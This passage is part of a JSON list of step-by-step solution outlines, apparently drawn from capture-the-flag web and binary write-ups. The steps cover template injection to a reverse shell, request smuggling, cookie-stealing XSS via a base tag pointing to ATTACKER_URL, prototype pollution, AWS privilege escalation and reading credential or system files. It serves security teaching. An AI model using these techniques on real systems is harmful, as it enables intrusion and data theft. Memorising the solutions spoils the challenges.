    "Loaded the challenge page as an 'iframe' in the exploit page.",
    "Waited for the API to be loaded in the challenge page.",
    "Sent a 'postMessage' linking the generated CSS to the target page.",
    "Redeployed the exploit GitHub page.",
    "Identify that it was a Jinja2 Template Injection challenge.",
    "Understood the extensive filter used for the challenge.",
    "Find a workaround for using '.' by employing the 'attr' filter.",
    "Use 'request.args' to bypass banned characters.",
    "Leverage 'lower' filter to bypass 'class' string.",
    "Leverage 'lower' filter to bypass 'subclasses' string.",
    "Leverage 'lower' filter to bypass 'getitem' string.",
    "Join the 'class' string with preceding and ending '__' characters using 'join' filter.",
    "Set 'x' corresponding to the index of 'subprocess.Popen'.",
    "Bruteforce the value of 'x' by submitting RCE payload with different 'x' values until a shell is received.",
    "Use a similar approach to bypass '.' character for callback domain.",
    "Use a similar approach to bypass '\"' character for bash command.",
    "Create final payload using all the methods of bypassing and injecting discovered.",
    "Submit the final payload to complete the challenge.",
    "Identified HAProxy configuration.",
    "Recognized that the '/flag' endpoint is case sensitive.",
    "Requested the '/FLAG' endpoint.",
    "Realized the existence of a HTTP request smuggling vulnerability.",
    "Executed a POST request.",
    "Included a second 'Content-Length' header with a value of 26.",
    "Placed a second dummy 'GET / HTTP/1.1' request.",
    "The second request was treated as a separate request by HAProxy.",
    "Modified the requests after reaching the backend server.",
    "Received a response for the second consequent request.",
    "The response corresponded to '/flag' instead of '/'.",
    "Incorporated delays between consecutive requests.",
    "Accounted for pipelining in the server.",
    "Sent the specially constructed requests to the server.",
    "Visit the target website.",
    "Identify the presence of the 'src=' parameter in the target website's HTML code.",
    "Examine the Content-Security-Policy of the target website.",
    "Observe the presence of a 'nonce' in the Content-Security-Policy that allows a script with src='assets/js/bootstrap.js'.",
    "Manipulate the '<base>' tag in the target website to change the base URL to the control of the attacker.",
    "Create a crafted attack URL with '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'.",
    "Host a custom script as 'assets/js/bootstrap.js' on the attacker-controlled site.",
    "Modify the script to append the created 'img' element to the document body.",
    "Trigger the browser to fetch the attacker-controlled site's root path, '/' with the cookie value appended.",
    "Capture the requests received by the server logs, thereby obtaining the admin's cookie.",
    "Conduct reconnaissance to identify potential target web application.",
    "Evaluate the web application's functionality to identify potential SSRF or file inclusion vectors.",
    "Gather information about the server-side tools used for document conversions.",
    "Conduct research to identify potential vulnerabilities of the LibreOffice tool.",
    "Create a LibreOffice word document with the name 'poc.odt'.",
    "Extract the contents of 'poc.odt' to access the 'content.xml' file.",
    "Open 'content.xml' and modify its contents to include a payload that links to the '/flag' file.",
    "Compress the modified files back into a zip archive named 'modified.odt'.",
    "Analyzed the challenge website where notes could be created and searched.",
    "Investigated the search function.",
    "Observed the usage of 302 server-side redirect to '/view' for a matching note.",
    "Discovered the possibility of using an oracle.",
    "Noted the purpose of the oracle in determining flag correctness.",
    "Confirmed the SameSite attribute of the cookies.",
    "Researched the Fetch API's limit of 20 redirects causing a network error.",
    "Identified the exploitation of a 302 redirect.",
    "Noted the flag leakage due to Fetch API redirect limit.",
    "Created an attacker server.",
    "Configured the attacker server to make 19 redirects.",
    "Redirected the attacker server to the target URL after 19 redirects.",
    "Created a PHP script.",
    "Tested the method.",
    "Identified the input.",
    "Tested rendering of the reflected input in the browser.",
    "Identified that an error was thrown during rendering.",
    "Identified the Content-Type of the XSL document as 'text/xsl'.",
    "Developed a payload utilizing 'x:script' to exploit the vulnerability.",
    "Identified that the input was being reflected.",
    "Tested rendering in the browser.",
    "Found that an error was thrown.",
    "Identified the Content-Type.",
    "Investigated methods for exploiting XSS attacks.",
    "Focused on exploiting XSS attacks accessing XSL document.",
    "Constructed a payload.",
    "The payload utilized was designed to fetch cookies.",
    "Analyze the Python code for the challenge.",
    "The code manages a market API.",
    "Understand that customer eligibility is based on fame and point history.",
    "Identify the bug in the API.",
    "The bug is in the unauthenticated index page.",
    "Register as a new user.",
    "Review the battle endpoint.",
    "LOYALTY_SYSTEM_ACTIVE is set to False.",
    "Increasing fame is impossible.",
    "Examine the buy endpoint.",
    "Understand purchasing requests and conditions.",
    "Note the introduced code problem.",
    "Mutable namedtuple assignment raises AttributeError.",
    "Realize modification of point history with each purchase request.",
    "Understand immutability of namedtuple and tuple.",
    "Note the difference between += and x = x + y.",
    "+= performs the operation in place when possible.",
    "+= tries to assign the result back to the variable.",
    "Understand successful modification of the list.",
    "Error is raised later in the assignment step.",
    "Send purchase requests to the API.",
    "Increase loyalty point history minimum of 1337 times.",
    "Unlock and buy the 'flagsword'.",
    "Complete the challenge.",
    "Identify that the code involves an XML parser.",
    "Notice the use of 'ElementInclude.include(root)' in the code.",
    "Understand that 'ElementInclude.include(root)' allows the use of XInclude directives.",
    "Recognize that XInclude directives allow the parsing of files.",
    "Identify that the server checks if 'text' is not included in 'xml.lower()'.",
    "Understand that 'parse=\"xml\"' raises an error when used with non-XML content.",
    "Devise a workaround by defining XML entities to form the string 'text'",
    "Use the workaround to parse the contents of '/etc/passwd' to the results",
    "Realize that the flag is in the environment variable.",
    "Read '/proc/self/environ' to retrieve the flag.",
    "Identify vulnerability in '/api/tet/list' endpoint.",
    "Notice vulnerability occurs when merging request data.",
    "Observe user input being passed to 'require()'.",
    "Consider potential .js file candidates for execution.",
    "Note that node_modules folder contains source code of installed modules.",
    "Execute 'grep' command.",
    "Find 'changelog.js' script.",
    "Find 'update-dist-tags.js' script.",
    "Analyze the 'changelog.js' script.",
    "Identify 'execSync' call in the script.",
    "Notice absence of arguments in 'require()' call.",
    "Identify 'process.argv[2]' as undefined.",
    "Plan to import the 'changelog.js' file after the pollution.",
    "Test the creation of a reverse shell.",
    "Send POST request to '/api/tet/list' endpoint.",
    "Send POST request to '/api/tet/years' endpoint.",
    "Include JSON payload in the request body.",
    "Expect the execution to result in a reverse shell.",
    "Navigate to the root directory.",
    "Read the flag.",
    "Visited the provided webpage",
    "Accessed HTML source to find clues",
    "Identified an S3 bucket in the HTML source",
    "Used AWS CLI to access the 'palindromecloudynekos' S3 bucket",
    "Found a passcode in the downloaded files",
    "Obtained AWS credentials from the response",
    "Identified privileged permissions to create AWS Lambda functions",
    "Identified privileged permissions to invoke AWS Lambda functions",
    "Deployed the Python script as a Lambda function",
    "Invoked the Lambda function",
    "Created an EC2 instance using the new role",
    "Configured the EC2 instance to trigger a reverse shell on startup",
    "Obtained new AWS credentials",
    "Scanned the 'flag_db' DynamoDB table",
    "Retrieved the flag from the 'flag_db' DynamoDB table",
    "Inspect the source code.",
    "Understand that the mysqljs/mysql package is used without the option stringifyObjects: true.",
    "Recognize that the express.json() allows Object and Array types to be given as req.body.email and req.body.password.",
    "Authenticate successfully.",
    "Discover that the Express application is put behind a reverse proxy (Apache Traffic Server).",
    "Realize that the /do-report endpoint is mapped to /forbidden.",
    "Recognize that access is prevented unless not going through the proxy.",
    "Research about the versions of Node.js and ATS used.",
    "Find a HTTP request smuggling issue with incorrect parsing of chunk extensions.",
    "Modify the available PoC to suit the given context.",
    "Smuggle a request to the backend application.",
    "Understand that the verify.pug template has an unescaped username.",
    "Learn about the Scroll-To-Text-Fragment (STTF).",
    "Understand that STTF allows scrolling to a specific portion of the page using a text snippet in the URL.",
    "Use the lazy-loaded image.",
    "Detect if a scroll occurred when a text fragment is parsed in the URL.",
    "Automate the submission of different text fragments.",
    "Use this method to bruteforce the admin token one character at a time.",
    "Automate the full exploit chain in solve.py.",
    "Adjust necessary parameters in the python script.",
    "Review challenge",
    "Identify goal: purchase flag with starting balance of zero",
    "Identify weak point in code",
    "Result: buyer's balance increases due to subtraction in 'buyFlag' function",
    "Initiate exploitation",
    "Create separate account",
    "Buy flag sold with negative price",
    "Perform Insecure Direct Object Reference (IDOR)",
    "Directly access flag with 'flag_id=3' using HTTP POST /buy request",
    "Identify the need to perform an XSS attack.",
    "Note the presence of a Content Security Policy (CSP) to prevent XSS attacks.",
    "Observe that the page uses relative JavaScript paths.",
    "Notice that the scripts are always executed due to the `nonce` in the CSP.",
    "Change the base URI of the page.",
    "Recognize that this is usually not possible due to the CSP.",
    "Host a file at `/static/page.js` on the attacker server.",
    "Exfiltrate data.",
    "Create a new script element.",
    "Add the appropriate `nonce` from the rest of the script tags.",
    "Set the script source to the data wanted to exfiltrate.",
    "Append the new script to the body of the document.",
    "Receive the flag on the attacker server.",
    "Indicate the successful execution of the attack.",
    "Establish session.",
    "Send GET request to 'https://shiba.yactf.ru/'.",
    "Send GET request to 'https://shiba.yactf.ru/api/boop' 1500 times within the loop.",
    "Print response from the server using command r.text.",
    "Send GET request to 'https://shiba.yactf.ru/' to get the final page after 1500 iterations.",
    "Print the content of the final page.",
    "Print the session cookies.",
    "Discover that the website uses JWT tokens.",
    "Understand the JWT processing by the server.",
    "Note that the public key, verifyKey, is used to validate JWT signature in both HS256 and RS256 cases.",
    "Realize that the server signs new RS256 tokens with the private key, signKey.",
    "Understand that we can generate our own HS256 token since we know the public key.",
    "Sign a token with the public key verifyKey.",
    "Set the number of 'boops' in the token to 1501.",
    "Collect the flag from the server's response.",
    "Registered a new user.",
    "Attempted to login which returns 'User not active' error.",
    "Examined 'auth.py'.",
    "Requested an OTP at '/request_code'.",
    "Noticed rate limiting being enforced on a per-email basis through a Redis store.",
    "Identified that the rate limiting limits the number of OTP attempts to 3.",
    "Tried to insert '%' wildcard to bypass check.",
    "Attempted to bypass `is_valid_email(email)` function.",
    "Failed as the function doesn't allow special characters like '%'.",
    "Understood that the `'re.match'` only matches at the _beginning_ of the string.",
    "Noticed that wildcards are allowed at the _end_ of the email due to `'re.match'` behavior.",
    "Created a script to brute force the OTP by appending '%' to the email and incrementally changing the OTP.",
    "Gained access by passing the OTP check.",
    "Ensured the user script run by application was active.",
    "Identified a post made by admin with the flag.",
    "Inspected Create Post code.",
    "Recognized a restrictive CSP.",
    "Analysed the server's CSP policy.",
    "After unsuccessful attempts searching for YouTube's JSONP endpoints.",
    "Exploited YouTube's JSONP response and BeautifulSoup's parsing differential.",
    "Identified the URL of the flag containing post '/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b' from the exfiltrated contents.",
    "Request the website.",
    "Specify the 'news' category by adding '?cat=news' to the URL.",
    "Analyze the HTML response.",
    "Attempt to break out of the string with a single quote in '?cat=news''.",
    "Notice that the site prepends a backslash to escape the single quote.",
    "Discover that the backslash character itself isn't escaped.",
    "Attempt to break out using '?cat=news\\\\''.",
    "Find that any brackets or subsequent quotes are still escaped.",
    "Conclude that an alternate route to XSS is required.",
    "Observe the site fetching resources.",
    "Utilize the 'cat' parameter in a request to '/ajax/articles?cat=asdf\"x=\"'.",
    "Review the jQuery documentation.",
    "Identify a feature in the documentation.",
    "Remove the 'noscript' tag.",
    "Load only the 'img' element.",
    "Circumvent restrictions.",
    "Craft a '?cat=random\"onerror=\"alert`` img' request.",
    "Execute an XSS attack.",
    "Steal the admin's cookie.",
    "Retrieve the challenge flag.",
    "Inspect the search feature of the provided platform",
    "Look at the responses when searching for a note",
    "Examine the issued redirects",
    "Notice the difference in redirect URLs when a note is found or not found",
    "Consider the potential of exploiting the system by bloating the URL length (via the 'ids' parameter) to hit a limitation",
    "Explore the possibility of detecting a client-side error when exceeding Chrome's maximum URL length (2MB)",
    "Notice that if the URL limit is hit, the origin of the page remains that of the parent window",
    "Test the observation by creating a URL for a successful and unsuccessful query respectively",
    "Leverage a backend server to eliminate unsuccessful queries and zero in on the correct flag",
    "Consider the downside of the above PoC - the potential strain on the server due to very long URLs",
    "Explore the alternative of exploiting Cross-Origin Resource Sharing (CORS) policy violation as a faster and more efficient method",
    "Create a policy that only allows form submissions to a specific domain",
    "Queries leading to a different domain will be blocked",
    "Observe that the violation can be detected through a 'securitypolicyviolation' event listener",
    "Analyze the AsmBB source's render2.asm file",
    "The render2.asm file contains a hash table of commands used by the templating engine",
    "Inspect the functionality of the 'minimag' command",
    "Inspect the functionality of the 'bbcode' command",
    "Test inputting content in MiniMag format",
    "Test inputting content in BBCode format",
    "The content in MiniMag and BBCode format is accepted as 'format' in the post submission request data",
    "Familiarize with TranslateBBCode routine",
    "TranslateBBCode routine is in bbcode.asm file part of FreshLib",
    "TranslateBBCode routine processes BBCode tags",
    "Explore the HTML encoding process of individual characters",
    "The HTML encoding process of individual characters is done in the loop function",
    "The unencoded content being reflected leads to an alert in the browser",
    "Identify two other POST-based XSS vectors",
    "Determine that a setting called 'Pipe the emails through' uses the 'smtp_exec' variable",
    "The 'smtp_exec' variable is used as an argument to the Exec2 routine",
    "Upon granting admin privileges",
    "Use the server's IP address and port number in the command",
    "Put all components of the attack together",
    "Vulnerability found in `utils.merge()` method",
    "Create a fetch request",
    "Modify fetch request to include polluted `credentials: include` option",
    "Use the credentials for `http://app/` in the fetch request",
    "Inject the output into the exploit page's `style` element",
    "Identify ATS and Puma as the systems involved in the smuggling.",
    "Recognize ATS interpreting \"chunked\" as chunked.",
    "Recognize Puma ignoring invalid / unsupported TE values.",
    "Perform a Server Side Request Forgery (SSRF) with the smuggled request.",
    "Host a server to capture the request.",
    "Decode the field First-Flag.",
    "Understand that the previous request smuggling method will not capture the second response from Puma.",
    "Find out that the second obstacle is HTTP request smuggling.",
    "Identify ATS and Waitress as the systems involved in the smuggling.",
    "Understand that ATS processes LF as line endings.",
    "Understand that Waitress allows LF in chunked extensions.",
    "Craft a request with LF in chunk extension.",
    "Note how ATS processes the LF as the end-of-line.",
    "Note how the second request is encapsulated in the chunked content of the first request.",
    "Confirm that Waitress sees both received requests.",
    "Run the command 'python3 payload.py | nc localhost 8000'.",
    "Capture the request.",
    "Decode the field flag from the receiving server.",
    "Extract the second flag from the decoded field.",
    "Understand that the Request smuggling vulnerabilities were discovered during previous research.",
    "Recognized that /api/flag-plz is mapped to /forbidden.",
    "Recognized that /api is mapped to /.",
    "Realized that http://flagportal.chall.seetf.sg:10001/api//flag-plz would be mapped to http://backend/flag-plz.",
    "Identified 2 HTTP request smuggling vulnerabilities.",
    "Used the discovered mapping to smuggle a request to /admin in flagportal.",
    "Constructed a request to /admin.",
    "Obtained the first flag.",
    "Included a \\n character in a chunk extension in the second part of the challenge.",
    "Crafted another request smuggling attack.",
    "Encapsulated the second request within the chunked contents of the first request.",
    "Used python3 payload.py | nc localhost 8000 to see the second flag on the receiving server.",
    "Include request body with 'logging' attribute set to true.",
    "Include Thymeleaf expression to fetch the value of 'FLAG' environment variable.",
    "Provide authentication to view the server logs.",
    "View '/etc/passwd' using LFI vulnerability.",
    "Construct PHP payload.",
    "Include '/tmp/pwn.php' using LFI.",
    "Understand that the challenge focuses on exploiting dynamic renderers",
    "Understand that Prerender is used to render sensitive endpoints",
    "Understand that the rendering is done via a custom host header",
    "Attempt to display the flag within the response body",
    "Attempt to achieve this using client-sided redirects",
    "Acknowledge the implementation of extra checks",
    "Understand that XSS within the Chromium renderer is necessary",
    "Understand that the usage of 'localhost:3000' origin avoids the Same Origin Policy",
    "Take notice of the 'validateUrls' mechanism",
    "Use 'Host: app@ATTACKER_URL' to bypass the validation",
    "Recognize the naive 'script remover'",
    "Understand that script tags can be bypassed using 'onload' event handlers",
    "Acknowledge the replacement of flags by Nginx",
    "Understand that redirects to 'http://app/login.php' will not solve the challenge",
    "Understand the requirement of achieving XSS within the 'localhost:3000' origin",
    "Understand the usage of 'localhost:3000/render?url=' feature",
    "Understand the need to avoid the same-origin policy for reading the flag",
    "Host the 'outer.html' file",
    "Host the 'inner.html' file",
    "Send a GET request to 'outer.html'",
    "The URL is fetched for the first time to check for an SSRF attempt.",
    "The URL is fetched for the second time once it's deemed legitimate.",
    "Realized that the two-fetch mechanism could be exploited with two different responses.",
    "Configured the server to give two different responses.",
    "The first response is designed to pass the SSRF check.",
    "Notice that 'mootools' JavaScript library is used.",
    "Identify that if the request token is wrong, then the 'request.accessGranted' attribute would not be set.",
    "Observe that the 'request.accessGranted' attribute becomes undefined in such cases.",
    "Manipulate the 'accessGranted' attribute to bypass Access Denied error.",
    "Notice that a 'note' is 'found' if it starts with 'request.search'.",
    "Use the navigation factor.",
    "Perform an XS leak attack.",
    "Verify if a substring exists in the flag.",
    "Conduct an extraction of the flag character by character.",
    "Identify the suspicious logic of the JavaScript.",
    "Check if 'length' query parameter exists.",
    "Verify if 'length' query parameter is a string of length 0.",
    "Notice that the 'name' variable is not declared in this case.",
    "Observe that global scope is the window object in HTML.",
    "Note that the 'name' variable refers to 'window.name'.",
    "Understand that 'window.name' can be controlled when a new window is opened.",
    "Decide to control the 'window.name' variable.",
    "Recognize that this control can be used to exploit the vulnerability.",
    "Recreate the scenario where 'name' variable is never redeclared.",
    "Create an exploit script.",
    "Control the 'window.name' variable with the exploit script.",
    "Use an XSS payload.",
    "Successfully fetch the flag using the XSS payload.",
    "Identified a Use After Free (UAF) vulnerability.",
    "Noticed that the HEAD never updates if the first index is removed.",
    "Realized that `HEAD->name` can be controlled.",
    "Identified the next `malloc()` call in `insertSorted()` where the overwrite can happen.",
    "Noted the absence of ASLR in WASM.",
    "Understood that `$var8` represents the pointer to the newly allocated memory for the payload.",
    "Noted that the index is randomized.",
    "Recognized the 10% chance of success.",
    "Understood the strategy of executing multiple times until the index is 0."
]